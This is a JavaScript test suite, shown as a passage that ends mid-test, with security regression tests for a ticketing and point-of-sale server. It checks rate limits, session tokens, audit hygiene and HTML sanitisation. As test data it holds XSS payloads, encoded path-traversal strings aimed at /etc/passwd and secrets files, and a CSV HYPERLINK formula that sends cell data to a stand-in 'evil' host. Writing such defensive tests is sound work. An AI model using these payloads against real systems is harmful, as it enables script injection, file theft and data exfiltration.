'use strict';
// Security-specific probes: burst-login behavior, token forgery/epoch handling,
// audit hygiene (no passwords in the trail), and static-path traversal guards.
const test = require('node:test');
const assert = require('node:assert');
const crypto = require('node:crypto');
const fs = require('node:fs');
const http = require('node:http');
const path = require('node:path');
const os = require('node:os');

const { createApp } = require('../server/main');
const { Router, sendCSV } = require('../server/core/http');
const { openDb, migrate } = require('../server/core/db');
const { seed } = require('../server/core/seed');
const { clientIp, verifyPassword, hashPassword } = require('../server/core/auth');

const MIGRATIONS = path.join(__dirname, '..', 'server', 'migrations');

function tempDb() {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'op-test-'));
  return path.join(dir, 'test.db');
}

async function startServer(opts = {}) {
  const { server, db } = createApp(opts.dbPath || tempDb(), opts);
  await new Promise((resolve) => server.listen(0, '127.0.0.1', resolve));
  const base = `http://127.0.0.1:${server.address().port}`;
  return { server, db, base };
}

// minimal cookie-carrying client
function client(base) {
  let cookie = '';
  return async (method, apiPath, body) => {
    const res = await fetch(base + apiPath, {
      method,
      headers: { 'content-type': 'application/json', cookie },
      body: body === undefined ? undefined : JSON.stringify(body),
    });
    const setCookie = res.headers.get('set-cookie');
    if (setCookie) cookie = setCookie.split(';')[0];
    let data = null;
    try { data = await res.json(); } catch { /* ignore */ }
    return { status: res.status, data };
  };
}

const SECRET = 'cd'.repeat(32);
const BOOTSTRAP = 'operator-bootstrap-pass';
const PROD_ENV = {
  OWLPOS_MODE: 'production', OWLPOS_SECRET: SECRET,
  OWLPOS_BOOTSTRAP_ADMIN_PASSWORD: BOOTSTRAP,
  OWLPOS_INIT_DB: '1', // these tests are deliberate first boots on a scratch path
};

function sign(payload) {
  return `${payload}.${crypto.createHmac('sha256', SECRET).update(payload).digest('base64url')}`;
}

test('security: login burst — 429s before scrypt work, health stays responsive', async (t) => {
  const { server, db, base } = await startServer();
  t.after(() => server.close());

  const results = await Promise.all(
    Array.from({ length: 50 }, () =>
      fetch(base + '/api/auth/login', {
        method: 'POST', headers: { 'content-type': 'application/json' },
        body: JSON.stringify({ username: 'admin', password: 'wrong' }),
      }).then((r) => r.status)
    )
  );
  const limited = results.filter((s) => s === 429).length;
  assert.ok(limited >= 20, `expected the limiter to shed most of the burst, got ${limited} 429s`);
  assert.ok(results.every((s) => s === 401 || s === 429), 'only 401/429 under burst');

  // event loop not wedged: health answers promptly after the burst
  const health = await fetch(base + '/api/health');
  assert.equal(health.status, 200);

  // rate-limited attempts never reached the DB; the ones that did are audited
  const failed = db.prepare("SELECT COUNT(*) n FROM audit_log WHERE action = 'auth.login_failed'").get().n;
  assert.ok(failed >= 1 && failed <= 50 - limited, 'audited failures = attempts that passed the limiter');
});

test('security: token forgery and epoch revocation', async (t) => {
  const { server, db, base } = await startServer({ env: PROD_ENV });
  t.after(() => server.close());
  const me = (cookie) => fetch(base + '/api/auth/me', { headers: { cookie } });
  const exp = Date.now() + 3600_000;
  const b64admin = Buffer.from('admin').toString('base64url');

  // correctly signed current-format token at the right epoch (0) authenticates
  const good = sign(`${b64admin}.0.${exp}`);
  assert.equal((await me(`opsid=${good}`)).status, 200);

  // legacy 3-part token — even correctly signed — fails closed
  const legacy = sign(`${b64admin}.${exp}`);
  assert.equal((await me(`opsid=${legacy}`)).status, 401);

  // correctly signed but wrong epoch → dead (epoch is enforced against the DB)
  assert.equal((await me(`opsid=${sign(`${b64admin}.999.${exp}`)}`)).status, 401);
  // non-integer epoch → dead
  assert.equal((await me(`opsid=${sign(`${b64admin}.x.${exp}`)}`)).status, 401);
  // tampered epoch without re-signing → signature check kills it
  const tampered = good.replace(`.0.`, `.1.`);
  assert.equal((await me(`opsid=${tampered}`)).status, 401);
  // expired
  assert.equal((await me(`opsid=${sign(`${b64admin}.0.${Date.now() - 1000}`)}`)).status, 401);

  // a direct epoch bump (what revoke-sessions does) kills the previously good token
  db.prepare("UPDATE users SET token_epoch = token_epoch + 1 WHERE username = 'admin'").run();
  assert.equal((await me(`opsid=${good}`)).status, 401);
  assert.equal((await me(`opsid=${sign(`${b64admin}.1.${exp}`)}`)).status, 200);
});

test('security: approver credentials never leak into the audit trail', async (t) => {
  const { server, db, base } = await startServer();
  t.after(() => server.close());
  const cashier = client(base);
  await cashier('POST', '/api/auth/login', { username: 'cashier', password: 'cashier' });

  const { data: sell } = await cashier('GET', '/api/catalog/sellable?channel=pos');
  const adult = sell.products.find((p) => p.sku === 'ADULT');
  const order = (await cashier('POST', '/api/pos/orders', {
    lines: [{ product_id: adult.id, qty: 1 }],
  })).data.order;

  const probe = 'S3cret-Approval-Probe!';
  const deny = await cashier('POST', `/api/pos/orders/${order.id}/void`, {
    approver: { username: 'manager', password: probe },
  });
  assert.equal(deny.status, 403);
  const ok = await cashier('POST', `/api/pos/orders/${order.id}/void`, {
    approver: { username: 'manager', password: 'manager' },
  });
  assert.equal(ok.status, 200);

  for (const row of db.prepare('SELECT action, detail FROM audit_log').all()) {
    assert.ok(!(row.detail || '').includes(probe), `password leaked into ${row.action} detail`);
    assert.ok(!(row.detail || '').includes('"password"'), `password field in ${row.action} detail`);
  }
  const voidDetail = JSON.parse(
    db.prepare("SELECT detail FROM audit_log WHERE action = 'pos.order.void'").get().detail
  );
  assert.ok(voidDetail.approved_by > 0, 'void audit carries approved_by');
});

test('security: attempted usernames are truncated in the audit trail', async (t) => {
  const { server, db, base } = await startServer();
  t.after(() => server.close());
  // attackers paste passwords into the username field — cap what reaches the log
  const pasted = 'x'.repeat(200);
  await fetch(base + '/api/auth/login', {
    method: 'POST', headers: { 'content-type': 'application/json' },
    body: JSON.stringify({ username: pasted, password: 'x' }),
  });
  const row = db.prepare("SELECT detail FROM audit_log WHERE action = 'auth.login_failed'").get();
  assert.ok(JSON.parse(row.detail).username.length <= 64);
});

test('security: change-password shares the login throttle and lockout', async (t) => {
  const { server, db, base } = await startServer();
  t.after(() => server.close());
  const cashier = client(base);
  await cashier('POST', '/api/auth/login', { username: 'cashier', password: 'cashier' });

  // a stolen cookie must not be an unthrottled password oracle: the login
  // already used one limiter slot, so the 20th probe overflows the window
  const statuses = [];
  let firstError = null;
  for (let i = 0; i < 20; i++) {
    const r = await cashier('POST', '/api/auth/change-password', {
      current_password: `wrong-${i}`, new_password: 'longenough-pass',
    });
    if (firstError === null) firstError = r.data.error;
    statuses.push(r.status);
  }
  assert.deepEqual(statuses.slice(0, 19), Array(19).fill(403));
  assert.equal(firstError, 'bad_current_password');
  assert.equal(statuses[19], 429);

  // wrong current passwords count toward the account lockout
  const row = db.prepare("SELECT locked_until FROM users WHERE username = 'cashier'").get();
  assert.ok(row.locked_until, 'repeated wrong current passwords lock the account');
});

test('security: approver probes are rate-limited per IP', async (t) => {
  const { server, db, base } = await startServer();
  t.after(() => server.close());
  const cashier = client(base);
  await cashier('POST', '/api/auth/login', { username: 'cashier', password: 'cashier' });

  // unknown approver usernames never lock an account, so only the per-IP
  // limiter stands between a seller session and unbounded scrypt burn
  const statuses = [];
  for (let i = 0; i < 25; i++) {
    const r = await cashier('POST', '/api/pos/orders/999999/void', {
      approver: { username: `ghost-${i}`, password: 'nope' },
    });
    statuses.push(r.status);
  }
  assert.deepEqual(statuses.slice(0, 20), Array(20).fill(403));
  assert.deepEqual(statuses.slice(20), Array(5).fill(429));
  const locked = db.prepare('SELECT COUNT(*) n FROM users WHERE locked_until IS NOT NULL').get().n;
  assert.equal(locked, 0, 'unknown approver names must not lock real accounts');
});

test('security: dashboard financials are off-limits to the gate role', async (t) => {
  const { server, base } = await startServer();
  t.after(() => server.close());

  const gate = client(base);
  await gate('POST', '/api/auth/login', { username: 'gate', password: 'gate' });
  const denied = await gate('GET', '/api/reports/dashboard');
  assert.equal(denied.status, 403, 'gate is admissions-only — no revenue/KPI feed');

  // sellers keep their dashboard
  const cashier = client(base);
  await cashier('POST', '/api/auth/login', { username: 'cashier', password: 'cashier' });
  const ok = await cashier('GET', '/api/reports/dashboard');
  assert.equal(ok.status, 200);
  assert.equal(typeof ok.data.revenue_cents, 'number');
});

test('security: manager-authored html sections cannot script the store page', async (t) => {
  const { server, db, base } = await startServer();
  t.after(() => server.close());
  const manager = client(base);
  await manager('POST', '/api/auth/login', { username: 'manager', password: 'manager' });

  const evil = [
    '<img src=x onerror="fetch(\'/api/auth/revoke-sessions\',{method:\'POST\'})">',
    '<script>document.location=\'//evil\'</script>',
    '<a href="javascript:alert(1)">win a prize</a>',
    '<a href="java&#115;cript:alert(1)">entities</a>',
    '<svg onload=alert(1)></svg>',
    '<iframe src="/"></iframe>',
    '<p>Gates open at <strong>9am</strong>.</p>',
  ].join('\n');
  const r = await manager('POST', '/api/storefront/sections', {
    title: 'Injected', kind: 'html', config: { html: evil },
  });
  assert.equal(r.status, 200);

  // a row written before the sanitiser existed must be cleaned on the way out too
  db.prepare(`INSERT INTO store_sections (title, kind, sort, active, config)
              VALUES ('Legacy', 'html', 9, 1, ?)`)
    .run(JSON.stringify({ html: '<img src=x onerror=alert(1)><b>legit</b>' }));

  const layout = await fetch(base + '/api/store/layout').then((x) => x.json());
  for (const s of layout.sections.filter((x) => x.kind === 'html')) {
    assert.doesNotMatch(s.html, /onerror|onload|<script|<iframe|javascript:/i,
      `scriptable markup leaked to guests: ${s.html}`);
  }
  const injected = layout.sections.find((s) => s.title === 'Injected');
  assert.match(injected.html, /<strong>9am<\/strong>/, 'benign markup survives');
  const legacy = layout.sections.find((s) => s.title === 'Legacy');
  assert.match(legacy.html, /<b>legit<\/b>/);

  // the stored config is sanitised too, not just the guest feed
  const stored = (await manager('GET', '/api/storefront/sections')).data.sections
    .find((s) => s.title === 'Injected');
  assert.doesNotMatch(stored.config.html, /onerror|<script|javascript:/i);
});

test('security: integer fields reject null/[]/true instead of coercing', async (t) => {
  const { server, base } = await startServer();
  t.after(() => server.close());
  const manager = client(base);
  await manager('POST', '/api/auth/login', { username: 'manager', password: 'manager' });

  const sell = (await manager('GET', '/api/catalog/sellable?channel=pos')).data.products;
  const adult = sell.find((p) => p.sku === 'ADULT');
  assert.ok(adult.price_cents > 0);

  // Number(null)=0 — a cleared numeric field must 400, never zero the price
  for (const v of [null, true, [100], {}, '']) {
    const r = await manager('PUT', `/api/catalog/products/${adult.id}`, { price_cents: v });
    assert.equal(r.status, 400, `price_cents ${JSON.stringify(v)} must be rejected`);
  }
  const after = (await manager('GET', '/api/catalog/sellable?channel=pos')).data.products
    .find((p) => p.sku === 'ADULT');
  assert.equal(after.price_cents, adult.price_cents, 'price unchanged by rejected updates');

  // same helper in storefront: a null group_id must not become group 0
  const s = await manager('POST', '/api/storefront/sections', {
    title: 'X', kind: 'groups', config: { group_id: null },
  });
  assert.equal(s.status, 400);
});

test('security: recent-scans feed masks scanned credentials', async (t) => {
  const { server, db, base } = await startServer();
  t.after(() => server.close());
  const gate = client(base);
  await gate('POST', '/api/auth/login', { username: 'gate', password: 'gate' });

  // an active seeded member pass is a long-lived credential — scan it once
  const member = db.prepare("SELECT pass_code FROM members WHERE status = 'active'").get();
  const scan = await gate('POST', '/api/admissions/scan', { code: member.pass_code, gate: 'north' });
  assert.equal(scan.data.result, 'ok');

  const { recent } = (await gate('GET', '/api/admissions/recent')).data;
  assert.ok(recent.length >= 1);
  for (const a of recent) {
    assert.notEqual(a.code, member.pass_code, 'full member pass code leaked venue-wide');
    assert.ok(a.code.length < member.pass_code.length, 'code is masked');
  }
  // operators still get enough to eyeball: prefix + last 4
  assert.equal(recent[0].code, `${member.pass_code.slice(0, 2)}…${member.pass_code.slice(-4)}`);
});

test('security: static file traversal stays forbidden (regression guard)', async (t) => {
  const { server, base } = await startServer();
  t.after(() => server.close());
  // encoded slash defeats URL normalization; the server must still refuse
  const res = await fetch(base + '/..%2Fserver%2Fmain.js');
  assert.equal(res.status, 403);
  const res2 = await fetch(base + '/..%2F..%2Fetc%2Fpasswd');
  assert.equal(res2.status, 403);
});

test('security: malformed percent-escapes are a 400, never a process kill', async (t) => {
  const { server, base } = await startServer();
  t.after(() => server.close());
  // pre-fix: decodeURIComponent threw outside any try/catch, the dispatch
  // promise was discarded, and the unhandled rejection exited the process
  const bad = await fetch(base + '/%zz');
  assert.equal(bad.status, 400);
  assert.equal((await bad.json()).error, 'bad_request');
  const badApi = await fetch(base + '/api/%zz');
  assert.equal(badApi.status, 400);
  // a corrupt cookie must not fail the request either: it is treated as absent
  const badCookie = await fetch(base + '/api/health', { headers: { cookie: 'opsid=%zz' } });
  assert.equal(badCookie.status, 200);
  const meBadCookie = await fetch(base + '/api/auth/me', { headers: { cookie: 'opsid=%zz' } });
  assert.equal(meBadCookie.status, 401); // fails closed, not open
  // and the server answered all of that without dying
  assert.equal((await fetch(base + '/api/health')).status, 200);
});

test('security: static serving cannot escape into a sibling of webRoot', async (t) => {
  // /%2e%2e%2f survives WHATWG dot-segment normalization; a prefix-only
  // containment check then let it reach any sibling whose name starts with
  // the webRoot string (e.g. an operator's `cp -r web web.bak`)
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'op-web-'));
  fs.mkdirSync(path.join(dir, 'web'));
  fs.mkdirSync(path.join(dir, 'web.bak'));
  fs.writeFileSync(path.join(dir, 'web', 'index.html'), '<h1>ok</h1>');
  fs.writeFileSync(path.join(dir, 'web.bak', 'secrets.env'), 'OWLPOS_SECRET=deadbeef');
  const router = new Router({ webRoot: path.join(dir, 'web'), resolveUser: () => null });
  const server = http.createServer((req, res) => router.dispatch(req, res));
  await new Promise((resolve) => server.listen(0, '127.0.0.1', resolve));
  t.after(() => server.close());
  const base = `http://127.0.0.1:${server.address().port}`;

  assert.equal((await fetch(base + '/')).status, 200); // legit traffic unaffected
  const sibling = await fetch(base + '/%2e%2e%2fweb.bak%2fsecrets.env');
  assert.equal(sibling.status, 403, 'sibling of webRoot must be unreachable');
  const deep = await fetch(base + '/%2e%2e%2f%2e%2e%2fetc%2fpasswd');
  assert.equal(deep.status, 403);
  const nul = await fetch(base + '/index.html%00.png');
  assert.equal(nul.status, 403, 'NUL bytes must not reach fs.readFile');
});

test('security: sendCSV neutralises formula cells, keeps numbers readable', () => {
  let body = '';
  const res = { writeHead() { return this; }, end(b) { body = b; } };
  sendCSV(res, 'x.csv', [
    ['reason', 'amount'],
    ['=HYPERLINK("http://evil/"&A1,"x")', -1250],
    ['@SUM(1+1)*cmd', '-12.50'],
    ['+dial', '\tpayload'],
    ['-note', 'a,b'],
  ]);
  const lines = body.trim().split('\n');
  assert.equal(lines[1], `"'=HYPERLINK(""http://evil/""&A1,""x"")",-1250`);
  assert.equal(lines[2], `'@SUM(1+1)*cmd,-12.50`);
  assert.equal(lines[3], `'+dial,'\tpayload`);
  assert.equal(lines[4], `'-note,"a,b"`);
  // negative numbers — as numbers or preformatted strings — stay untouched
  assert.ok(lines[1].endsWith(',-1250'));
  assert.ok(lines[2].endsWith(',-12.50'));
});

test('security: X-Forwarded-For is ignored unless a trusted proxy is declared', () => {
  const req = (xff) => ({ socket: { remoteAddress: '10.0.0.1' }, headers: { 'x-forwarded-for': xff } });
  // default (no OWLPOS_TRUST_PROXY): the header is attacker-writable — ignore it
  assert.equal(clientIp(req('6.6.6.6'), false), '10.0.0.1');
  // opted in: the RIGHTMOST entry is the one the trusted proxy appended
  assert.equal(clientIp(req('6.6.6.6'), true), '6.6.6.6');
  assert.equal(clientIp(req('1.1.1.1, 2.2.2.2'), true), '2.2.2.2');
  // garbage or missing forwarded values fall back to the TCP peer
  assert.equal(clientIp(req('not-an-ip'), true), '10.0.0.1');
  assert.equal(clientIp({ socket: { remoteAddress: '10.0.0.1' }, headers: {} }, true), '10.0.0.1');
});

test('security: a garbage-username flood cannot 429 another account\'s login', async (t) => {
  const { server, base } = await startServer();
  t.after(() => server.close());
  const login = (username, password) => fetch(base + '/api/auth/login', {
    method: 'POST', headers: { 'content-type': 'application/json' },
    body: JSON.stringify({ username, password }),
  });
  // pre-fix the limiter keyed on the bare peer address, so 20 junk attempts
  // (one attacker, or every station behind one proxy) 429'd the whole venue
  for (let i = 0; i < 20; i++) assert.equal((await login('ghost', 'nope')).status, 401);
  assert.equal((await login('ghost', 'nope')).status, 429, 'the flooded account is throttled');
  const legit = await login('cashier', 'cashier');
  assert.equal(legit.status, 200, 'other accounts from the same address still sign in');
});

test('security: logout revokes the token — a captured cookie dies at sign-out', async (t) => {
  const { server, base } = await startServer();
  t.after(() => server.close());
  const login = await fetch(base + '/api/auth/login', {
    method: 'POST', headers: { 'content-type': 'application/json' },
    body: JSON.stringify({ username: 'admin', password: 'admin' }),
  });
  assert.equal(login.status, 200);
  const cookie = login.headers.get('set-cookie').split(';')[0];
  assert.equal((await fetch(base + '/api/auth/me', { headers: { cookie } })).status, 200);

  const out = await fetch(base + '/api/auth/logout', {
    method: 'POST', headers: { cookie, 'content-type': 'application/json' }, body: '{}',
  });
  assert.equal(out.status, 200);
  // replaying the captured token string after sign-out must fail: sessions are
  // stateless, so only the epoch bump — not the cleared browser cookie — kills it
  const replay = await fetch(base + '/api/auth/me', { headers: { cookie } });
  assert.equal(replay.status, 401);
});

// --- audit fixes, group B -------------------------------------------------

function freshDb() {
  const db = openDb(tempDb());
  migrate(db, MIGRATIONS);
  return db;
}

test('security: production mode never seeds a usable default credential', () => {
  // demo mode is unchanged: password == username, flagged for rotation
  const demo = freshDb();
  assert.equal(seed(demo, {}), true);
  const demoAdmin = demo.prepare("SELECT * FROM users WHERE username = 'admin'").get();
  assert.ok(verifyPassword('admin', demoAdmin.pass_hash), 'demo admin still logs in with admin');
  assert.equal(demoAdmin.active, 1);

  // production without a bootstrap password: fail closed, write nothing
  const noBootstrap = freshDb();
  assert.throws(
    () => seed(noBootstrap, { OWLPOS_MODE: 'production', OWLPOS_BOOTSTRAP_ADMIN_PASSWORD: '' }),
    /OWLPOS_BOOTSTRAP_ADMIN_PASSWORD/
  );
  assert.equal(noBootstrap.prepare('SELECT COUNT(*) AS n FROM users').get().n, 0);
  // the demo password (or anything short) is refused too
  assert.throws(
    () => seed(noBootstrap, { OWLPOS_MODE: 'production', OWLPOS_BOOTSTRAP_ADMIN_PASSWORD: 'admin' }),
    /OWLPOS_BOOTSTRAP_ADMIN_PASSWORD/
  );

  // production with a bootstrap password: no account accepts its username
  const prod = freshDb();
  const bootstrap = 'operator-chosen-bootstrap';
  assert.equal(
    seed(prod, { OWLPOS_MODE: 'production', OWLPOS_BOOTSTRAP_ADMIN_PASSWORD: bootstrap }),
    true
  );
  for (const username of ['admin', 'manager', 'cashier', 'gate']) {
    const u = prod.prepare('SELECT * FROM users WHERE username = ?').get(username);
    assert.ok(!verifyPassword(username, u.pass_hash), `${username}/${username} must not authenticate`);
    assert.equal(u.must_change_password, 1);
    assert.equal(u.active, username === 'admin' ? 1 : 0, `${username} active flag`);
  }
  const admin = prod.prepare("SELECT * FROM users WHERE username = 'admin'").get();
  assert.ok(verifyPassword(bootstrap, admin.pass_hash), 'admin takes the operator bootstrap password');

  // an existing DB that still carries a live demo credential refuses to start
  assert.throws(() => seed(demo, { mode: 'production' }), /still use the public demo password/);
  // …and stops refusing once the accounts are rotated / deactivated
  demo.prepare("UPDATE users SET pass_hash = ? WHERE username = 'admin'")
    .run(hashPassword('rotated-by-the-operator'));
  demo.prepare("UPDATE users SET active = 0 WHERE username IN ('manager','cashier','gate')").run();
  assert.equal(seed(demo, { mode: 'production' }), false);
});

test('security: anonymous checkout cannot post an unbounded cart', async (t) => {
  const { server, db, base } = await startServer();
  t.after(() => server.close());
  const guest = client(base);
  const { data: cat } = await guest('GET', '/api/store/catalog');
  const adult = cat.products.find((p) => p.sku === 'ADULT');
  const card = { number: '4242424242424242' };
  const customer = { name: 'Flooder', email: 'flood@example.com' };

  const manyLines = await guest('POST', '/api/store/checkout', {
    customer, card,
    lines: Array.from({ length: 200 }, () => ({ product_id: adult.id, qty: 999 })),
  });
  assert.equal(manyLines.status, 400);
  assert.equal(manyLines.data.error, 'too_many_lines');

  // under the line cap but still tens of thousands of ticket rows in one tx
  const manyUnits = await guest('POST', '/api/store/checkout', {
    customer, card,
    lines: Array.from({ length: 90 }, () => ({ product_id: adult.id, qty: 999 })),
  });
  assert.equal(manyUnits.status, 400);
  assert.equal(manyUnits.data.error, 'too_many_units');

  assert.equal(db.prepare('SELECT COUNT(*) AS n FROM tickets').get().n, 0);
  assert.equal(db.prepare("SELECT COUNT(*) AS n FROM orders WHERE status = 'paid'").get().n, 0);

  // a normal group booking still goes through
  const ok = await guest('POST', '/api/store/checkout', {
    customer, card, lines: [{ product_id: adult.id, qty: 40 }],
  });
  assert.equal(ok.status, 200);
  assert.equal(ok.data.order.tickets.length, 40);
});

test('security: guest name/email are length-capped before they reach every ticket', async (t) => {
  const { server, db, base } = await startServer();
  t.after(() => server.close());
  const guest = client(base);
  const { data: cat } = await guest('GET', '/api/store/catalog');
  const adult = cat.products.find((p) => p.sku === 'ADULT');
  const card = { number: '4242424242424242' };

  const huge = await guest('POST', '/api/store/checkout', {
    customer: { name: 'A'.repeat(100_000), email: 'huge@example.com' },
    card, lines: [{ product_id: adult.id, qty: 50 }],
  });
  assert.equal(huge.status, 400);
  assert.equal(huge.data.error, 'name_too_long');

  const hugeEmail = await guest('POST', '/api/store/checkout', {
    customer: { name: 'Ok Name', email: 'x'.repeat(5000) + '@example.com' },
    card, lines: [{ product_id: adult.id, qty: 1 }],
  });
  assert.equal(hugeEmail.status, 400);
  assert.equal(hugeEmail.data.error, 'email_required');
  assert.equal(db.prepare('SELECT COUNT(*) AS n FROM tickets').get().n, 0);

  // the POS channel carries the same amplification — createOrder caps on the way in
  const cashier = client(base);
  await cashier('POST', '/api/auth/login', { username: 'cashier', password: 'cashier' });
  const posOrder = await cashier('POST', '/api/pos/orders', {
    lines: [{ product_id: adult.id, qty: 2 }],
    customer: { name: 'B'.repeat(10_000), email: 'c'.repeat(10_000) + '@example.com' },
  });
  assert.equal(posOrder.status, 200);
  assert.ok(posOrder.data.order.customer_name.length <= 200);
  assert.ok(posOrder.data.order.customer_email.length <= 200);
  const fin = await cashier('POST', `/api/pos/orders/${posOrder.data.order.id}/finalize`, {
    payments: [{ method: 'card_sim', amount_cents: posOrder.data.order.total_cents }],
  });
  assert.equal(fin.status, 200);
  assert.ok(db.prepare('SELECT MAX(LENGTH(holder_name)) AS n FROM tickets').get().n <= 200);
});

test('security: fully discounted web checkout finalizes with no tender', async (t) => {
  const { server, db, base } = await startServer();
  t.after(() => server.close());
  const admin = client(base);
  assert.equal(
    (await admin('POST', '/api/auth/login', { username: 'admin', password: 'admin' })).status,
    200
  );
  assert.equal(
    (await admin('POST', '/api/catalog/discounts', {
      code: 'COMP100', name: 'Full comp', kind: 'percent', value: 100,
    })).status,
    200
  );

  const guest = client(base);
  const { data: cat } = await guest('GET', '/api/store/catalog');
  const adult = cat.products.find((p) => p.sku === 'ADULT');
  const r = await guest('POST', '/api/store/checkout', {
    customer: { name: 'Comped Guest', email: 'comp@example.com' },
    card: { number: '4242424242424242' },
    discount_code: 'COMP100',
    lines: [{ product_id: adult.id, qty: 1 }],
  });
  assert.equal(r.status, 200, JSON.stringify(r.data));
  assert.equal(r.data.order.total_cents, 0);
  assert.equal(r.data.order.status, 'paid');
  assert.equal(r.data.order.tickets.length, 1);
  assert.equal(
    db.prepare('SELECT COUNT(*) AS n FROM payments WHERE order_id = ?').get(r.data.order.id).n,
    0,
    'a zero total needs no payment row'
  );
});

test('security: finalize audits the user who tendered, not the order builder', async (t) => {
  const { server, db, base } = await startServer();
  t.after(() => server.close());
  const cashier = client(base);
  await cashier('POST', '/api/auth/login', { username: 'cashier', password: 'cashier' });
  const manager = client(base);
  await manager('POST', '/api/auth/login', { username: 'manager', password: 'manager' });

  const { data: sell } = await cashier('GET', '/api/catalog/sellable?channel=pos');
  const adult = sell.products.find((p) => p.sku === 'ADULT');
  const order = (await cashier('POST', '/api/pos/orders', {
    lines: [{ product_id: adult.id, qty: 1 }],
  })).data.order;

  // the cashier walks away; the manager takes the money on the same order
  const fin = await manager('POST', `/api/pos/orders/${order.id}/finalize`, {
    payments: [{ method: 'card_sim', amount_cents: order.total_cents }],
  });
  assert.equal(fin.status, 200);

  const ids = Object.fromEntries(
    db.prepare('SELECT username, id FROM users').all().map((u) => [u.username, u.id])
  );
  const row = db
    .prepare("SELECT * FROM audit_log WHERE action = 'pos.order.finalize' ORDER BY id DESC LIMIT 1")
    .get();
  assert.equal(row.user_id, ids.manager, 'actor is the user who tendered');
  assert.equal(JSON.parse(row.detail).order_cashier_id, ids.cashier, 'the builder is still recorded');
  // drawer attribution still follows the order's cashier (drawer-sessions spec)
  assert.equal(
    db.prepare('SELECT cashier_id FROM orders WHERE id = ?').get(order.id).cashier_id,
    ids.cashier
  );
});

test('security: a fenced approver cannot approve in production mode', async (t) => {
  // Half-rolled-out production deployment: the DB was seeded in demo mode, the
  // operator rotated the passwords out-of-band (must_change_password still set —
  // a live demo credential would refuse to start) and flipped on production.
  const dbPath = tempDb();
  {
    const db0 = openDb(dbPath);
    migrate(db0, MIGRATIONS);
    seed(db0, {});
    const rotate = db0.prepare('UPDATE users SET pass_hash = ? WHERE username = ?');
    rotate.run(hashPassword('cashier-initial-1'), 'cashier');
    rotate.run(hashPassword('manager-initial-1'), 'manager');
    db0.prepare("UPDATE users SET active = 0 WHERE username IN ('admin', 'gate')").run();
    db0.close();
  }
  const { server, db, base } = await startServer({ dbPath, env: PROD_ENV });
  t.after(() => server.close());
  const cashier = client(base);
  assert.equal(
    (await cashier('POST', '/api/auth/login', {
      username: 'cashier', password: 'cashier-initial-1',
    })).status,
    200
  );
  // the cashier rotates its own password, so only the approver is still fenced
  assert.equal(
    (await cashier('POST', '/api/auth/change-password', {
      current_password: 'cashier-initial-1', new_password: 'cashier-rotated-1',
    })).status,
    200
  );
  assert.equal(
    db.prepare("SELECT must_change_password AS m FROM users WHERE username = 'manager'").get().m,
    1
  );

  const { data: sell } = await cashier('GET', '/api/catalog/sellable?channel=pos');
  const adult = sell.products.find((p) => p.sku === 'ADULT');
  const order = (await cashier('POST', '/api/pos/orders', {
    lines: [{ product_id: adult.id, qty: 1 }],
  })).data.order;

  const attempt = await cashier('POST', `/api/pos/orders/${order.id}/void`, {
    approver: { username: 'manager', password: 'manager-initial-1' },
  });
  assert.equal(attempt.status, 403);
  assert.equal(attempt.data.error, 'approval_required');
  assert.equal(db.prepare('SELECT status FROM orders WHERE id = ?').get(order.id).status, 'open');

  // once the manager rotates, the same approval works
  const manager = client(base);
  await manager('POST', '/api/auth/login', {
    username: 'manager', password: 'manager-initial-1',
  });
  assert.equal(
    (await manager('POST', '/api/auth/change-password', {
      current_password: 'manager-initial-1', new_password: 'manager-rotated-1',
    })).status,
    200
  );
  const ok = await cashier('POST', `/api/pos/orders/${order.id}/void`, {
    approver: { username: 'manager', password: 'manager-rotated-1' },
  });
  assert.equal(ok.status, 200);
});

test('security: guest store never hands out another member’s pass code', async (t) => {
  const { server, db, base } = await startServer();
  t.after(() => server.close());
  const card = { number: '4242424242424242' };
  const guest = client(base);
  const { data: cat } = await guest('GET', '/api/store/catalog');
  const membership = cat.products.find((p) => p.sku === 'MEM-EXP');

  const victimEmail = 'victoria@example.com';
  const bought = await guest('POST', '/api/store/checkout', {
    customer: { name: 'Victoria Victim', email: victimEmail },
    card, lines: [{ product_id: membership.id, qty: 1 }],
  });
  assert.equal(bought.status, 200);
  const victim = db.prepare('SELECT * FROM members WHERE lower(email) = ?').get(victimEmail);
  assert.equal(bought.data.order.members[0].pass_code, victim.pass_code, 'the buyer sees their own new pass');

  // anonymous attacker buys a membership against the victim's (unverified) email
  const attacker = client(base);
  const r = await attacker('POST', '/api/store/checkout', {
    customer: { name: 'Mallory Attacker', email: victimEmail },
    card, lines: [{ product_id: membership.id, qty: 1 }],
  });
  assert.equal(r.status, 200);
  assert.ok(!JSON.stringify(r.data).includes(victim.pass_code), 'gate credential must not leak');
  assert.ok(!JSON.stringify(r.data).includes('Victoria Victim'), 'legal name must not leak');
  assert.equal(r.data.order.members.length, 1);
  assert.equal(r.data.order.members[0].pass_code, '');
  assert.equal(r.data.order.members[0].renewal, true);

  // …and the later lookup (the attacker owns both halves of the key) leaks nothing either
  const look = await attacker(
    'GET',
    `/api/store/order?code=${r.data.confirmation}&email=${encodeURIComponent(victimEmail)}`
  );
  assert.equal(look.status, 200);
  assert.ok(!JSON.stringify(look.data).includes(victim.pass_code));
  assert.ok(!JSON.stringify(look.data).includes('Victoria Victim'));

  // the seeded member (zero prior interaction) is just as protected
  const dana = db.prepare("SELECT * FROM members WHERE email = 'dana@example.com'").get();
  const atDana = await attacker('POST', '/api/store/checkout', {
    customer: { name: 'Mallory Attacker', email: 'dana@example.com' },
    card, lines: [{ product_id: membership.id, qty: 1 }],
  });
  assert.equal(atDana.status, 200);
  assert.ok(!JSON.stringify(atDana.data).includes(dana.pass_code));
  assert.ok(!JSON.stringify(atDana.data).includes('Dana Demo'));
});

test('security: an open drawer’s cash is not readable back through the order API', async (t) => {
  const { server, db, base } = await startServer();
  t.after(() => server.close());
  const cashier = client(base);
  await cashier('POST', '/api/auth/login', { username: 'cashier', password: 'cashier' });
  assert.equal((await cashier('POST', '/api/drawer/open', { float_cents: 5000 })).status, 200);
  const sessionId = (await cashier('GET', '/api/drawer/current')).data.session.id;

  const { data: sell } = await cashier('GET', '/api/catalog/sellable?channel=pos');
  const adult = sell.products.find((p) => p.sku === 'ADULT');
  const order = (await cashier('POST', '/api/pos/orders', {
    lines: [{ product_id: adult.id, qty: 2 }],
  })).data.order;
  const fin = await cashier('POST', `/api/pos/orders/${order.id}/finalize`, {
    payments: [{ method: 'cash', amount_cents: order.total_cents + 500 }],
  });
  assert.equal(fin.status, 200);
  assert.equal(fin.data.change_cents, 500); // the sale being rung is still shown

